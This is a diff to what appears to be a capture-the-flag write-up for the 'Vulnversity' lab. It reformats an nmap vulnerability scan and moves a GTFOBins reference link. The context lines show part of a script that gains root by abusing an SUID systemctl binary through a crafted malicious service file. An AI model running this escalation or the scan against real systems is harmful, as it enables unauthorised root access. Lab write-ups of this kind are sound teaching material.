@@ -7,7 +7,8 @@
 Scanning the machine with:
 
 ```bash
-sudo nmap -vv -oA vulnversity -A -sS --script vuln -p- 10.10.157.9
+sudo nmap -vv -oA vulnversity -A -sS --script vuln \
+          -p- 10.10.157.9
 ```
 
 Output:
@@ -417,7 +418,7 @@ One nice trick is that after fuzzing your way around file extension filters, you
 
 ### Privilege Escalation
 
-It turns out that SUID systemctl doesn't require sudo to run, which means that you can [craft a malicious service file to gain root access](https://gtfobins.github.io/gtfobins/systemctl/):
+It turns out that SUID systemctl doesn't require sudo to run, which means that you can craft a malicious service file to gain root access:
 
 ```bash
 FILE=`mktemp -u`
@@ -431,6 +432,8 @@ systemctl link $FILE.service
 systemctl start $FILE.service
 $FILE.sh -p # Root!
 ```
+
+* [systemctl (GTFOBins)](https://gtfobins.github.io/gtfobins/systemctl/)
 
 - - - -
 
